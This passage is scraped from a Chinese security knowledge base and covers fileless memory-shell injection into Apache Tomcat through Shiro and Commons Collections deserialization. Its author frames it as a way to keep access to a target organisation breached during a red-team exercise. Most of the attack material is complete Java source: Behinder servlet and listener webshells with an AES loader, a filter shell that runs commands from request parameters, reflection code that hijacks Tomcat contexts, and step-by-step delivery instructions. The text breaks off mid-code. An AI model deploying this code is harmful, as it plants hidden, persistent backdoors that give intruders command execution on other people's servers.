Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd2\")).getInputStream()).useDelimiter(\"\\\\A\").next()); response.getWriter().flush(); } catch (Exception e) { e.printStackTrace(); } } 完整代码如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 然后使用CB1序列化成文件，通过data参数传输过去 步骤 首先先使用shiro的反序列化，先序列化Main.class，通过base64编码+AES编码之后查看payload是否可用 然后将需要注入的servlet通过cb1序列化 再使用POST请求，data参数携带这一串base64编码之后的CB1.ser，传输的时候一定要记得url编码 然后去掉Cookie，所有的参数，使用cmd2参数执行命令 当普通马都能注入，那就继续注入冰蝎马（这里说一下，为什么我对冰歇情有独钟😂，普通马在url中可以执行其实也行，主要是客户端webshell管理工具用起来真的很爽😂） 0x2 注入Servlet 冰歇马 同Tomcat内存马无文件攻击中的Servlet注入冰歇马一样，同样通过在service方法中添加冰歇马 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 完整代码如下 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 同上步骤，在data参数处，反序列化以上代码生成的序列化文件 首先生成cookie，查看是否正常 再将Servlet内存冰歇马序列化，最后再通过data参数传输 0x3 注入Listener冰歇内存马 同Tomcat内存马无文件攻击中的Listener注入冰歇马一样 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; public class BehinderListener extends AbstractTranslet implements ServletRequestListener { public BehinderListener() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new BehinderListener(); standardContext.addApplicationEventListener(listener); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 提出问题 在天下大木头的github中，提供的payload-TomcatEcho.ser、TomcatEcho.java中，我在本地编译生成TomcatEcho.class，以及TomcatEcho.ser文件大小都超过了MaxHTTPHeaderSize，我自己编译的文件都无法反序列化，但是天下大木头提供的TomcatEcho.ser就可以注入成功，该环境下的tomcatHeader.ser、tomcatInject.ser无法使用，报错为文章开头的未能转化webappclassloaderbase 参考链接 fnmsd-Java中间件通用回显方法的问题及处理 fnmsd-通用版shiro回显 天下大木头-ShiroVulnEnv Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:41 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/13.Shiro550无文件内存马.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/14.Tomcat内存马无文件攻击.html":{"url":"知识库/02.JAVA安全/14.Tomcat内存马无文件攻击.html","title":"14.Tomcat内存马无文件攻击","keywords":"","body":" 简介 背景 Tomcat架构原理 Connecter(连接器) ProtocolHandler组件 Endpoint组件 Adapter组件 Container(容器) 请求定位Servlet的过程 Tomcat类加载器 总结 Tomcat 回显 环境 动态注册Filter 反序列化注入Filter 存入request和response 简单分析 测试 注入冰蝎马 request和session对象 pageContext对象 反序列化注入Servlet 注入普通马 注入冰蝎马 反序列化注入Listener 注入普通马 注入冰蝎马 参考链接 简介 在Tomcat内存马基础入门中，只介绍了对应对于在tomcat中，当jsp文件落地之后动态创建filter,servlet,listener，那么当只能代码执行（也就是文件不能落地）的情况下，就需要利用漏洞，通过反序列化写入内存马，在jsp文件中，request是内置对象，在普通java文件中，要通过层层反射去取对应的request，这就是其中的难点之一；以及在代码执行一般就只执行命令，也没有回显，所以使用Tomcat回显命令也是一个很重要的思路 背景 在某HW过程中，通过shiro拿到某单位的门户权限，留后门的过程中发现该CMS不解析jsp，访问直接404，对应路径没有问题，其他诸如js的等文件都能访问，也没有nginx反向代理对jsp文件进行拦截，就只有一个Tomcat开放着80端口，拿到服务器之后解密后台密码，发现也没有对整个站点的配置情况，时间紧，任务重，此时就需要对目标环境进行权限维持，此时不管是Linux权限维持还是Web权限维持，都需要做，这里针对该目标进行web权限维持，通过shiro反序列化来进行内存马植入。 Tomcat架构原理 此部分全部来自P1n93r-Tomcat 架构原理 Tomcat的启动流程如下： startup.sh -> catalina.sh start -> java -jar org.apache.catalina.startup.Bootstrap.main() Tomcat需要实现的2个核心功能： 处理socket连接，负责网络字节流与Request和Response对象的转化 加载并管理Servlet，以及处理具体的Request请求 为此Tomcat设计了两个核心组件： 连接器（Connector）和容器（Container），连接器负责对外交流，容器负责内部处理；同时Tomcat为了实现支持多种IO模型和应用层协议，多个连接器对接一个容器。 Server 对应一个Tomcat实例； Service 默认只有一个，一个Tomcat实例默认一个Service； Connector 一个Service可能多个连接器，接收不同的连接协议； Container 多个连接器对应一个容器，顶层容器其实就是Engine； 每个组件都有对应的生命周期，需要启动的话，还需要启动自己内部的子组件，比如一个Tomcat实例包含一个Service，一个Service包含多个连接器和一个容器。而一个容器又包含多个Host，Host内部可能有多个Context容器，而一个Context也会包含多个Servlet。整体是一个俄罗斯套娃。 Connecter(连接器) Tomcat支持的IO模型有： NIO：非阻塞IO，采用Java NIO类库实现； NIO2：异步IO，采用JDK7最新的的NIO2类库实现； APR：采用Apache可移植运行库实现，是C/C++编写的本地库； Tomcat支持的应用层协议有： HTTP/1.1：绝大部分WEB应用采用的访问协议； AJP：用于和WEB服务器集成； HTTP/2：HTTP 2.0大幅度提升了WEB性能； 所以一个容器可能对接多个连接器，连接器对Servlet容器屏蔽了网络协议和IO模型，无论是HTTP还是AJP协议，在容器中获取到的都是一个标准的ServletRequest对象。 细化连接器的功能就是： 监听网络端口； 接收网络连接请求； 读取请求网络字节流； 根据具体的应用层协议解析字节流，生成统一的Tomcat Request对象； 将Tomcat Request对象转换成标准的ServletRequest对象； 调用Servlet容器，得到ServletResponse对象； 将ServletResponse转成Tomcat Response对象； 将Tomcat Response转成网络字节流； 将响应字节流写回给浏览器； 其中，Tomcat设计了三个组件，其负责功能如下： EndPoint：负责网络通信，将字节流传递给Processor； Processor：负责处理字节流生成Tomcat Request对象，将Tomcat Request对象传递给Adapter； Adapter：负责将Tomcat Request对象转成ServletRequest对象，传递给容器； 再细化一下连接器，得到如下架构图： ProtocolHandler组件 Endpoint和Processor放在一起抽象成了ProtocolHandler组件，主要负责处理： 网络连接和应层协议 。 Endpoint组件 Endpoint是通信端点，是具体的Socket接收和发送处理器，是对传输层的抽象。因此Endpoint是用TCP/IP协议来进行数据读写的，本质是调用Socket接口； 简而言之，Endpoint接收到Socket连接后，生成一个SocketProcessor任务提交到线程池进行处理，SocketProcessor的run方法将调用Processor组件进行应用层协议的解析，Processor解析后生成Tomcat Request对象，然后会调用Adapter的Service方法，方法内部通过如下代码将Request请求传递到容器中： // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke(request, response); Adapter组件 由于协议的不同，Tomcat定义了自己的Request类来存放请求信息，但是这个不是标准的ServletRequest。于是需要使用Adapter将Tomcat Request对象转成ServletRequest对象，然后就可以调用容器的service方法了； Container(容器) Connector连接器负责外部交流，Container容器负责内部处理。也就是： 连接器处理Socket通信和应用层协议的解析，得到ServletRequest，而容器则负责处理ServletRequest。 容器顾名思义，就是用来装东西的，Tomcat容器就是用来装载Servlet的； Tomcat设计了4种容器：Engine、Host、Context和Wrapper。这四种容器是父子关系，如下图所示： 一个Host多个Context，一个Context包含多个Servlet； Wrapper表示一个Servlet，Context表示一个WEB应用程序，而一个WEB应用可以有多个Servlet； Host表示一个虚拟机，或者说一个站点，一个Tomcat可以配置多个站点； 一个站点可以部署多个WEB应用； Engine代表引擎，用于管理多个站点（Host），一个Service只能有一个Engine； 下面是Tomcat的配置文件，可以反应这些层次关系： // 顶层组件，可包含多个 Service，代表一个 Tomcat 实例 // 顶层组件，包含一个 Engine ，多个连接器 // 连接器 // 容器组件：一个 Engine 处理 Service 所有请求，包含多个 Host // 容器组件：处理指定Host下的客户端请求， 可包含多个 Context // 容器组件：处理特定 Context Web应用的所有客户端请求 请求定位Servlet的过程 Tomcat使用Mapper组件来完成请求到Wrapper中Servlet的定位的；Mapper组件的功能就是将用户请求的URL定位到一个Servlet，它的工作原理是： Mapper组件里保存了WEB应用的配置信息，也就是容器组件与访问路径的映射关系 。比如Host容器里配置的域名、Context容器里的WEB应用路径以及Wrapper容器里Servlet映射的路径。这是一个多层次的Map； 当一个请求过来，Mapper组件通过解析请求URL里的域名和路径，再到自己保存的Map里去找，就能定位到一个Servlet。 最终，一个请求URL只会定位到一个Wrapper容器，也就是一个Servlet 。 连接器中的Adapter会调用容器的service方法来执行Servlet，最先拿到请求的是Engine容器，Engine容器对请求做一些处理后，会把请求传给自己的子容器Host继续处理，以此类推，最终这个请求会传给Wrapper容器，Wrapper容器会调用最终的Servlet来处理。 整个调用过程是通过Pipeline-Valve管道进行的 。 Pipeline-Valve是责任链模式，责任链模式是指：在一个请求处理的过程中，有很多处理者一次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后再调用下一个处理者继续处理 。Valve表示一个处理点（也就是一个处理阀门），Valve中的invoke方法就是来处理请求的。 Valve的数据结构如下： public interface Valve { public Valve getNext(); public void setNext(Valve valve); public void invoke(Request request, Response response) } Pipeline的数据结构如下： public interface Pipeline { public void addValve(Valve valve); public Valve getBasic(); public void setBasic(Valve valve); public Valve getFirst(); } Pipeline中有addValve方法，维护了Valve链表，Valve可以插入到Pipeline中，对请求做某些处理。Pipeline中是没有invoke方法的，因为整个调用链的触发是Valve来完成的，Valve完成自己的处理后，调用getNext().invoke()来触发下一个Valve调用。 每个容器都有一个Pipeline对象，只要触发了这个Pipeline的第一个Valve，这个容器里的Pipeline中的Valve都会被调用到。 其中，Pipeline中的getBasic方法获取的Valve处于Valve链的末端，它是Pipeline中必不可少的一个Valve， 负责调用下层容器的Pipeline里的第一个Valve 。 演示图如下图所示： 而整个过程是通过连接器CoyoteAdapter中的service方法触发的，它会调用Engine的第一个Valve，如下所示： @Override public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) { // 省略其他代码 // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke( request, response); ... } Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。 Tomcat类加载器 Tomcat自定义的类加载器WebAppClassloader为了隔离WEB应用打破了双亲委托机制，它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载WEB应用自己定义的类。 同时，为了防止WEB应用自己的类覆盖JRE的核心类，在本地WEB应用目录下查找之前，先使用ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类； 总结 最终得到总体的请求流程图，如下图所示： Tomcat 回显 该部分大部分来自于threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 环境 jdk jdk8u181 tomcat tomcat8.5.79 首先可以看看一个普通http请求进来的时候，tomcat的部分执行栈： doGet:27, HelloServlet (com.fastjson.test) service:655, HttpServlet (javax.servlet.http) service:764, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) [2] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) [1] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:197, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:543, AuthenticatorBase (org.apache.catalina.authenticator) invoke:135, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:367, CoyoteAdapter (org.apache.catalina.connector) service:639, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:882, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1647, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 按照kingkk师傅的方法，利用的点是在 org.apache.catalina.core.ApplicationFilterChain.internalDoFilter： 其中通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，执行完了所有的Filter了**filter.doFilter(request, response, this)**,这个致命的缺点就会导致shiro无法获取到response回显，因为shiro本身就是一个filter private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if (this.pos 动态注册Filter 通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了，要实现动态动态注册filter，第一个步骤就是要获取到request和response，第二步则是通过request或者response去创建filter 在这里需要知道ApplicationDispather.WRAP_SAME_OBJECT这个变量为false，且lastServiceRequest初始化都为null，如果能将其request,response都set进去，那么则可以直接获取到request，在这里就需要通过反射将ApplicationDispather.WRAP_SAME_OBJECT设置为true使其走到对应的条件语句中来 这样当我们第二次访问的时候将 response 从 lastServicedResponse 中取出来，然后将我们命令执行的结果直接写在 response 里面就可以了 在这里我们先使用一个servlet来本地尝试一下： 第一次访问利用反射修改特定参数，从而将 request 和 response 存储到 lastServicedRequest 和 lastServicedResponse 中 第二次访问将我们需要的 request 和 response 取出，从而将结果写入 response 中从而达到回显目的 创建一个Servlet，在web.xml里声明name，和path package com.fastjson.test; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.io.Writer; import java.lang.reflect.Field; import java.lang.reflect.Modifier; @WebServlet(\"/echo\") @SuppressWarnings(\"all\") public class ShellServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try{ Class applicationDispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\"); WRAP_SAME_OBJECT_FIELD.setAccessible(true); // 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性 Field f0 = Class.forName(\"java.lang.reflect.Field\").getDeclaredField(\"modifiers\"); f0.setAccessible(true); f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL); Class applicationFilterChain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); Field lastServicedRequestField = applicationFilterChain.getDeclaredField(\"lastServicedRequest\"); Field lastServicedResponseField = applicationFilterChain.getDeclaredField(\"lastServicedResponse\"); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL); f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL); ThreadLocal lastServicedRequest = (ThreadLocal) lastServicedRequestField.get(applicationFilterChain); ThreadLocal lastServicedResponse = (ThreadLocal) lastServicedResponseField.get(applicationFilterChain); String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter(\"cmd\"):null; if (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == null || lastServicedResponse == null){ WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true); lastServicedRequestField.set(applicationFilterChain,new ThreadLocal()); lastServicedResponseField.set(applicationFilterChain,new ThreadLocal()); } else if (cmd!=null){ InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); StringBuilder sb = new StringBuilder(\"\"); byte[] bytes = new byte[1024]; int line = 0; while ((line = inputStream.read(bytes))!=-1){ sb.append(new String(bytes,0,line)); } Writer writer = lastServicedResponse.get().getWriter(); writer.write(sb.toString()); writer.flush(); } }catch (Exception e){ e.printStackTrace(); } } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 首先在访问/echo的时候，第一次访问ApplicationDispatcher.WRAP_SAME_OBJECT这里为false 在这里就会直接把resquest和response 给对应访问的servlet（ShellServlet）然后可以看到 然后到ShellServlet#doGet()的时候，则会进入到if分支因为当前的ApplicationDispather.WRAP_SAME_OBJECT为false，且lastServicedRequest,lastServicedResponse初始化都为null，通过反射将ApplicationDispather.WRAP_SAME_OBJECT这个变量修改为true，并将lastServicedRequest,lastServicedResponse初始化实例化 由于修改值之后，最后到finally，lastServicedRequest，lastServicedResponse又会被设置为(Object) null 然后第二次访问的时候，此时ApplicationDispather.WRAP_SAME_OBJECT为true，进入条件分支，此时lastServicedRequest，lastServicedResponse都已经被赋值 然后到我们的Servlet当中来可以看到，传入的参数cmd被获取到，直接就会执行Runtime.getRuntime().exec() 最后再通过response回显到页面中 反序列化注入Filter 在进行反序列化注入之前，这里使用之前写的Commons Collections 系列靶场 这里主要需要执行两步： 第一步将 request 和 response 存入到 lastServicedRequest 和 lastServicedResponse 中 第二步从 lastServicedRequest 和 lastServicedResponse 获取到我们的 request 和 response ，然后利用 request 获取到 servletcontext 然后动态注册 Filter 存入request和response 第一步还是和上面一样需要存入request 和 response 到 lastServicedRequest 和 lastServicedResponse，在这里写一个TomcatEcho类需要继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）在其静态代码块中反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化 这里贴一下threedr3am师傅的代码 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 当第一步通过反序列化完成之后，那么WRAP_SAME_OBJECT 值为 true，lastServicedRequest和lastServicedResponse这两个ThreadLocal也都初始化了，那么就能够获取到request，就能获取ServletContext，进而获取到StandardContext 代码如下： package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.LifecycleState; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; /** * @author threedr3am */ public class TomcatInject extends AbstractTranslet implements Filter { /** * webshell命令参数名 */ private final String cmdParamName = \"cmd\"; private final static String filterUrlPattern = \"/*\"; private final static String filterName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null){ Field ctx = servletContext.getClass().getDeclaredField(\"context\"); ctx.setAccessible(true); ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext); Field stdctx = appctx.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(appctx); if (standardContext != null){ // 这样设置不会抛出报错 Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, LifecycleState.STARTING_PREP); Filter myFilter =new TomcatInject(); // 调用 doFilter 来动态添加我们的 Filter // 这里也可以利用反射来添加我们的 Filter javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName,myFilter); // 进行一些简单的设置 filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // 设置基本的 url pattern filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); // 将服务重新修改回来，不然的话服务会无法正常进行 if (stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // 在设置之后我们需要 调用 filterstart if (standardContext != null){ // 设置filter之后调用 filterstart 来启动我们的 filter Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); /** * 将我们的 filtermap 插入到最前面 */ Class ccc = null; try { ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\"); } catch (Throwable t){} } //把filter插到第一位 Method m = Class.forName(\"org.apache.catalina.core.StandardContext\") .getDeclaredMethod(\"findFilterMaps\"); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i 简单分析 首先将第一步中存入的 request 进行取出 在下面这个静态方法中就是获取对应的ServletContext，当然需要配合第一步的已经修改WRAP_SAME_OBJECT 值为 true 在利用取出的 request 获取到 servletContext 后，就会调用 addFilter 来动态添加 然后在doFilter()函数里完成逻辑就行 测试 在这里使用Y4er——ysoserial大哥修改过的ysoserial，在其中我提取ClassLoaderTemplate，在项目中加入该jar包 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = 